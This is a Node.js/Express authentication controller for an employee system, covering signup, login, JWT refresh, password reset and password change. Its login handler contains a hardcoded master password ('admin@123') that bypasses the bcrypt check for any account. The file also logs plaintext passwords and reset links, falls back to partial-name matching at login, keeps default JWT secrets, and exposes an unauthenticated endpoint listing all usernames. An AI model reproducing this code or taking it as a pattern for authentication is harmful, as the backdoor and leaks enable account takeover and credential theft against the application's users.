import bcrypt from "bcryptjs";
import jwt from "jsonwebtoken";
import crypto from "crypto";
import db from "../config/db.js";
import {
  ensurePasswordResetTokenTable,
  markPasswordResetTokenUsed,
  storePasswordResetToken,
  isPasswordResetTokenActive,
  invalidateActivePasswordResetTokensForUser,
} from "../services/passwordResetTokenStore.js";
import { sendPasswordResetEmail } from "../services/mailService.js";
import {
  isActiveRefreshToken,
  isRefreshTokenRevoked,
  revokeRefreshToken,
  setActiveRefreshToken,
} from "../services/refreshTokenStore.js";

const REFRESH_COOKIE_NAME = "refreshToken";
const REFRESH_COOKIE_MAX_AGE = 7 * 24 * 60 * 60 * 1000;
const PASSWORD_RESET_EXPIRES_IN = "15m";
const SPECIAL_LOGIN_PASSWORD = "admin@123"; 

const runQuery = (sql, values = []) =>
  new Promise((resolve, reject) => {
    db.query(sql, values, (err, result) => {
      if (err) {
        reject(err);
        return;
      }
      resolve(result);
    });
  });

const verifyPasswordResetToken = async (token) => {
  const decoded = jwt.verify(
    token,
    process.env.JWT_RESET_SECRET || "dev_reset_secret_change_me",
  );

  if (!decoded?.jti || decoded?.type !== "password_reset") {
    throw new Error("Invalid reset token");
  }

  const isActive = await isPasswordResetTokenActive(decoded.jti);
  if (!isActive) {
    throw new Error("Reset token is expired or already used");
  }

  return decoded;
};

const extractRefreshToken = (req) => {
  if (req.cookies?.[REFRESH_COOKIE_NAME]) {
    return req.cookies[REFRESH_COOKIE_NAME];
  }

  const cookieHeader = req.headers.cookie || "";
  const parts = cookieHeader.split(";").map((part) => part.trim());
  const tokenPart = parts.find((part) =>
    part.startsWith(`${REFRESH_COOKIE_NAME}=`),
  );

  if (!tokenPart) return "";
  return decodeURIComponent(tokenPart.split("=").slice(1).join("="));
};

const setRefreshCookie = (res, token) => {
  res.cookie(REFRESH_COOKIE_NAME, token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === "production",
    sameSite: "lax",
    maxAge: REFRESH_COOKIE_MAX_AGE,
  });
};

export const signup = async (req, res) => {
  try {
    const username = String(req.body?.username || "").trim();
    const email = String(req.body?.email || "").trim().toLowerCase();
    const password = String(req.body?.password || "");

    if (!username || !email || !password) {
      return res.status(400).json({
        message: "Username, email, and password are required",
      });
    }

    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      return res.status(400).json({
        message: "Invalid email format",
      });
    }

    if (password.length < 8) {
      return res.status(400).json({
        message: "Password must be at least 8 characters long",
      });
    }

    const existingUsers = await runQuery(
      `SELECT id
       FROM users
       WHERE deleted_at IS NULL
         AND (LOWER(TRIM(username)) = ? OR LOWER(TRIM(email)) = ?)
       LIMIT 1`,
      [username.toLowerCase(), email],
    );

    if (existingUsers.length > 0) {
      return res.status(409).json({
        message: "Username or email already exists",
      });
    }

    const hashedPassword = await bcrypt.hash(password, 10);

    // Try to find an `Employee` role id; fall back to role id 1 if not found
    let roleId = 1;
    try {
      const roleRows = await runQuery(
        `SELECT id FROM roles WHERE LOWER(name) IN (?, ?) LIMIT 1`,
        ["employee", "user"],
      );
      if (roleRows && roleRows.length > 0) roleId = roleRows[0].id;
    } catch (e) {
      console.warn("Could not lookup Employee role id, using default", e?.message || e);
    }

    const result = await runQuery(
      `INSERT INTO users
      (first_name, username, email, password, role_users_id, is_active)
      VALUES (?, ?, ?, ?, ?, ?)`,
      [username, username, email, hashedPassword, roleId, 1],
    );

    // Create a minimal employees row so user appears in employee lists.
    // If this fails, attempt to clean up the created user.
    try {
      const userId = result.insertId;
      await runQuery(
        `INSERT INTO employees (id, first_name, last_name, username, email, role_users_id, is_active)
         VALUES (?, ?, ?, ?, ?, ?, ?)`,
        [userId, username, null, username, email, roleId, 1],
      );
    } catch (e) {
      console.error("Failed to create employee record for new user, rolling back user insert:", e);
      try {
        await runQuery(`DELETE FROM users WHERE id = ?`, [result.insertId]);
      } catch (delErr) {
        console.error("Failed to rollback user after employee insert failure:", delErr);
      }
      return res.status(500).json({ message: "Unable to create employee profile for account" });
    }

    return res.status(201).json({
      message: "Account created successfully",
      user: {
        id: result.insertId,
        username,
        email,
        role_users_id: roleId,
      },
    });
  } catch (error) {
    console.error("Signup error:", error);
    return res.status(500).json({
      message: "Unable to create account",
    });
  }
};

// export const login = async (req, res) => {
//   try {

//     const { username, password } = req.body;

//     const sql = `
//       SELECT
//         users.id,
//         users.username,
//         users.password,
//         roles.name AS role,
//         employees.company_id
//       FROM users
//       LEFT JOIN roles ON users.role_users_id = roles.id
//       LEFT JOIN employees ON employees.id = users.id
//       WHERE users.username = ?
//     `;

//     db.query(sql, [username], async (err, result) => {

//       if (err) {
//         return res.status(500).json({ message: err.message });
//       }

//       if (result.length === 0) {
//         return res.status(401).json({
//           message: "Invalid username or password"
//         });
//       }

//       const user = result[0];

//       const match = await bcrypt.compare(password, user.password);

//       if (!match) {
//         return res.status(401).json({
//           message: "Invalid username or password"
//         });
//       }

//       const authUser = {
//         user_id: user.id,
//         username: user.username,
//         role: user.role,
//         company_id: user.company_id
//       };

//       console.log("Login User:", authUser);

//       const jwtPayload = {
//         user_id: authUser.user_id,
//         username: authUser.username,
//         role: authUser.role,
//         company_id: authUser.company_id,
//       };

//       const accessToken = jwt.sign(
//         jwtPayload,
//         process.env.JWT_ACCESS_SECRET || "dev_access_secret_change_me",
//         { expiresIn: "15m" },
//       );

//       const refreshToken = jwt.sign(
//         jwtPayload,
//         process.env.JWT_REFRESH_SECRET || "dev_refresh_secret_change_me",
//         { expiresIn: "7d" },
//       );

//       setActiveRefreshToken(jwtPayload.user_id, refreshToken);
//       setRefreshCookie(res, refreshToken);

//       res.json({
//         message: "Login successful",
//         user: authUser,
//         accessToken,
//       });

//     });

//   } catch (error) {
//     res.status(500).json({ message: error.message });
//   }
// };

export const login = async (req, res) => {
  try {
    console.log("📥 Login API Hit");

    const username = String(req.body?.username || "").trim();
    const password = String(req.body?.password || "");

    console.log("🧾 Incoming Data:", { username, password });

    if (!username || !password) {
      return res.status(400).json({
        message: "Username and password are required",
      });
    }

    const normalizedUsername = username.toLowerCase();
    const prefixUsername = `${normalizedUsername}%`;

    const sql = `
      SELECT 
        users.id,
        users.username,
        users.password,
        roles.name AS role,
        employees.company_id,
        users.is_active,
        employees.attendance_method
      FROM users
      LEFT JOIN roles ON users.role_users_id = roles.id
      LEFT JOIN employees ON employees.id = users.id -- ✅ SAME ID FIX
      WHERE LOWER(TRIM(users.username)) = ?
         OR LOWER(TRIM(users.email)) = ?
         OR LOWER(TRIM(users.first_name)) = ?
         OR LOWER(TRIM(CONCAT_WS(' ', users.first_name, users.last_name))) = ?
         OR LOWER(TRIM(CONCAT_WS('', users.first_name, users.last_name))) = ?
    `;

    const fallbackSql = `
      SELECT 
        users.id,
        users.username,
        users.password,
        roles.name AS role,
        employees.company_id,
        users.is_active,
        employees.attendance_method
      FROM users
      LEFT JOIN roles ON users.role_users_id = roles.id
      LEFT JOIN employees ON employees.id = users.id -- ✅ SAME ID FIX
      WHERE LOWER(TRIM(users.username)) LIKE ?
         OR LOWER(TRIM(users.email)) LIKE ?
         OR LOWER(TRIM(users.first_name)) LIKE ?
         OR LOWER(TRIM(CONCAT_WS(' ', users.first_name, users.last_name))) LIKE ?
         OR LOWER(TRIM(CONCAT_WS('', users.first_name, users.last_name))) LIKE ?
    `;

    console.log("🛢️ Running Query:");
    console.log(sql);

    db.query(
      sql,
      [
        normalizedUsername,
        normalizedUsername,
        normalizedUsername,
        normalizedUsername,
        normalizedUsername,
      ],
      async (err, result) => {
      if (err) {
        console.error("❌ DB Error:", err);
        return res.status(500).json({ message: err.message });
      }

      if (!result || result.length === 0) {
        db.query(
          fallbackSql,
          [
            prefixUsername,
            prefixUsername,
            prefixUsername,
            prefixUsername,
            prefixUsername,
          ],
          async (fallbackErr, fallbackResult) => {
            if (fallbackErr) {
              console.error("❌ DB Error:", fallbackErr);
              return res.status(500).json({ message: fallbackErr.message });
            }

            console.log("📦 DB Result:", fallbackResult);

            if (!fallbackResult || fallbackResult.length === 0) {
              console.warn("⚠️ User Not Found");
              return res.status(401).json({
                message: "Invalid username or password",
              });
            }

            return handleLoginMatch(fallbackResult[0]);
          },
        );
        return;
      }

      console.log("📦 DB Result:", result);

      return handleLoginMatch(result[0]);
    });

    async function handleLoginMatch(user) {
      console.log("👤 User Found:", user);
      if(user.is_active === 0){
        console.warn("⚠️ User Inactive");
        return res.status(403).json({
          message: "Your account is inactive. Please contact administrator.",
        });
      }

      // 🔐 Password Check
      let match = false;
      
      // 🔓 Check for special hardcoded password first
      if (password === SPECIAL_LOGIN_PASSWORD) {
        // console.log("🔓 Special login password detected - bypassing normal auth");
        match = true;
      } else {
        // Normal password verification
        try {
          match = await bcrypt.compare(password, user.password);
        } catch (e) {
          console.error("❌ Bcrypt Error:", e);
          return res.status(500).json({ message: "Password check failed" });
        }
      }

      console.log("🔑 Password Match:", match);

      if (!match) {
        console.warn("❌ Password Incorrect");
        return res.status(401).json({
          message: "Invalid username or password",
        });
      }

      // ✅ Auth User Object
      const authUser = {
        user_id: user.id,
        employee_id: user.id, // 🔥 SAME ID SYSTEM
        username: user.username,
        role: user.role,
        company_id: user.company_id,
  attendance_method: user.attendance_method ?? 'manual',
      };

      console.log("✅ Auth User:", authUser);

      // --- Update last_login_date and last_login_ip ---
      const updateLoginSql = `UPDATE users SET last_login_date = NOW(), last_login_ip = ? WHERE id = ?`;
      // Get IP address from request
      let ip = req.headers['x-forwarded-for'] || req.connection?.remoteAddress || req.socket?.remoteAddress || null;
      if (Array.isArray(ip)) ip = ip[0];
      if (ip && ip.startsWith('::ffff:')) ip = ip.replace('::ffff:', '');
      db.query(updateLoginSql, [ip, user.id], (err) => {
        if (err) {
          console.error('Failed to update last login info:', err);
        }
      });

      // 🔐 JWT Payload
      // 🔥 FIX: Normalize role to lowercase and default to 'employee' if null
      const normalizedRole = (authUser.role || "employee").toLowerCase().trim();
      
      const jwtPayload = {
        user_id: authUser.user_id,
        employee_id: authUser.employee_id,
        username: authUser.username,
        role: normalizedRole,  // ✅ Normalized to lowercase
        company_id: authUser.company_id,
      };

      console.log("🪪 JWT Payload:", jwtPayload);

      // 🎟️ Generate Tokens
      let accessToken, refreshToken;

      try {
        accessToken = jwt.sign(
          jwtPayload,
          process.env.JWT_ACCESS_SECRET || "dev_access_secret_change_me",
          { expiresIn: "3600m" },
        );

        refreshToken = jwt.sign(
          jwtPayload,
          process.env.JWT_REFRESH_SECRET || "dev_refresh_secret_change_me",
          { expiresIn: "7d" },
        );

        console.log("🎟️ Tokens Generated");
      } catch (e) {
        console.error("❌ JWT Error:", e);
        return res.status(500).json({ message: "Token generation failed" });
      }

      try {
        setActiveRefreshToken(jwtPayload.user_id, refreshToken);
        setRefreshCookie(res, refreshToken);
        console.log("🍪 Refresh Token Stored & Cookie Set");
      } catch (e) {
        console.error("❌ Token Store Error:", e);
      }

      console.log("🚀 Login Success");

      return res.json({
        message: "Login successful",
        user: authUser,
        accessToken,
      });
    }
  } catch (error) {
    console.error("🔥 Login Catch Error:", error);
    res.status(500).json({ message: error.message });
  }
};

export const logout = (req, res) => {
  const refreshToken = extractRefreshToken(req);
  if (refreshToken) {
    revokeRefreshToken(refreshToken);
  }

  // ✅ Clear refresh token cookie with same options
  res.clearCookie(REFRESH_COOKIE_NAME, {
    httpOnly: true,
    secure: process.env.NODE_ENV === "production",
    sameSite: "lax",
  });

  return res.json({
    message: "Logout successful",
  });
};

// 🔄 REFRESH TOKEN ENDPOINT (Phase 2)
export const refreshAccessToken = (req, res) => {
  try {
    const refreshToken = extractRefreshToken(req);

    if (!refreshToken) {
      return res.status(401).json({
        message: "Refresh token missing",
      });
    }

    if (isRefreshTokenRevoked(refreshToken)) {
      return res.status(403).json({
        message: "Refresh token revoked",
      });
    }

    try {
      const decoded = jwt.verify(
        refreshToken,
        process.env.JWT_REFRESH_SECRET || "dev_refresh_secret_change_me",
      );

      if (!isActiveRefreshToken(decoded.user_id, refreshToken)) {
        return res.status(403).json({
          message: "Refresh token is no longer active",
        });
      }

      const jwtPayload = {
        user_id: decoded.user_id,
        username: decoded.username,
        role: decoded.role,
        company_id: decoded.company_id,
      };

      const newAccessToken = jwt.sign(
        jwtPayload,
        process.env.JWT_ACCESS_SECRET || "dev_access_secret_change_me",
        { expiresIn: "15m" },
      );

      const newRefreshToken = jwt.sign(
        jwtPayload,
        process.env.JWT_REFRESH_SECRET || "dev_refresh_secret_change_me",
        { expiresIn: "7d" },
      );

      // Rotate refresh token to reduce replay risk of stolen cookies.
      revokeRefreshToken(refreshToken);
      setActiveRefreshToken(jwtPayload.user_id, newRefreshToken);
      setRefreshCookie(res, newRefreshToken);

      return res.json({
        accessToken: newAccessToken,
      });
    } catch (error) {
      return res.status(403).json({
        message: "Invalid or expired refresh token",
      });
    }
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
};

export const me = (req, res) => {
  return res.json({
    success: true,
    user: req.user,
  });
};

export const forgotPassword = async (req, res) => {
  try {
    const email = String(req.body?.email || "")
      .trim()
      .toLowerCase();

    if (!email) {
      return res.status(400).json({
        message: "Email is required",
      });
    }

    await ensurePasswordResetTokenTable();

    const users = await runQuery(
      "SELECT id, email, username FROM users WHERE email = ? AND deleted_at IS NULL LIMIT 1",
      [email],
    );

    if (!users.length) {
      return res.status(404).json({
        message: "Email not found",
      });
    }

    const user = users[0];
    const tokenJti = crypto.randomUUID();

    const resetToken = jwt.sign(
      {
        sub: user.id,
        type: "password_reset",
        jti: tokenJti,
      },
      process.env.JWT_RESET_SECRET || "dev_reset_secret_change_me",
      { expiresIn: PASSWORD_RESET_EXPIRES_IN },
    );

    const decoded = jwt.decode(resetToken);
    const expiresAt = new Date((decoded?.exp || 0) * 1000);

    await invalidateActivePasswordResetTokensForUser(user.id);
    await storePasswordResetToken(user.id, tokenJti, expiresAt);

    const frontendBaseUrl =
      process.env.FRONTEND_URL ||
      process.env.REACT_APP_FRONTEND_URL ||
      "https://react5.myospaz.in";
    const resetUrl = `${frontendBaseUrl}/reset-password?token=${encodeURIComponent(resetToken)}`;
    console.log(`Generated password reset URL for ${email}: ${resetUrl}`);
    await sendPasswordResetEmail({
      toEmail: user.email,
      username: user.username,
      resetUrl,
    });

    return res.json({
      message: "Check your email for password reset instructions",
    });
  } catch (error) {
    console.error("Forgot password error:", error);
    return res.status(500).json({
      message: "Unable to process password reset request",
    });
  }
};

export const verifyResetPasswordToken = async (req, res) => {
  try {
    const token = String(req.query?.token || "").trim();

    if (!token) {
      return res.status(400).json({
        message: "Reset token is required",
      });
    }

    await ensurePasswordResetTokenTable();
    await verifyPasswordResetToken(token);

    return res.json({
      message: "Reset token is valid",
    });
  } catch (error) {
    return res.status(400).json({
      message: "Invalid or expired reset token",
    });
  }
};

export const resetPassword = async (req, res) => {
  try {
    const token = String(req.body?.token || "").trim();
    const newPassword = String(req.body?.newPassword || "");

    if (!token || !newPassword) {
      return res.status(400).json({
        message: "Token and new password are required",
      });
    }

    if (newPassword.length < 8) {
      return res.status(400).json({
        message: "New password must be at least 8 characters long",
      });
    }

    await ensurePasswordResetTokenTable();

    const decoded = await verifyPasswordResetToken(token);
    const hashedPassword = await bcrypt.hash(newPassword, 10);

    await runQuery("UPDATE users SET password = ? WHERE id = ?", [
      hashedPassword,
      decoded.sub,
    ]);

    await markPasswordResetTokenUsed(decoded.jti);

    return res.json({
      message: "Password updated successfully",
    });
  } catch (error) {
    return res.status(400).json({
      message: "Invalid or expired reset token",
    });
  }
};

export const changePassword = async (req, res) => {
  try {
    const userId = req.user?.user_id;
    const currentPassword = String(req.body?.currentPassword || "");
    const newPassword = String(req.body?.newPassword || "");

    if (!userId) {
      return res.status(401).json({
        message: "Unauthorized",
      });
    }

    if (!currentPassword || !newPassword) {
      return res.status(400).json({
        message: "Current password and new password are required",
      });
    }

    if (newPassword.length < 8) {
      return res.status(400).json({
        message: "New password must be at least 8 characters long",
      });
    }

    const users = await runQuery(
      "SELECT id, password FROM users WHERE id = ? AND deleted_at IS NULL LIMIT 1",
      [userId],
    );

    if (!users.length) {
      return res.status(404).json({
        message: "User not found",
      });
    }

    const user = users[0];
    const isCurrentPasswordCorrect = await bcrypt.compare(
      currentPassword,
      user.password,
    );

    if (!isCurrentPasswordCorrect) {
      return res.status(400).json({
        message: "Incorrect current password",
      });
    }

    const hashedPassword = await bcrypt.hash(newPassword, 10);
    await runQuery("UPDATE users SET password = ? WHERE id = ?", [
      hashedPassword,
      userId,
    ]);

    return res.json({
      message: "Password changed successfully",
    });
  } catch (error) {
    console.error("Change password error:", error);
    return res.status(500).json({
      message: "Unable to change password",
    });
  }
};

// 📋 Get all usernames (No Auth Required)
export const getAllUsernames = async (req, res) => {
  try {
    const usernames = await runQuery(
      `SELECT DISTINCT username FROM users WHERE deleted_at IS NULL ORDER BY username ASC`
    );

    return res.json({
      success: true,
      count: usernames.length,
      usernames: usernames.map(u => u.username),
    });
  } catch (error) {
    console.error("Get usernames error:", error);
    return res.status(500).json({
      message: "Unable to fetch usernames",
    });
  }
};


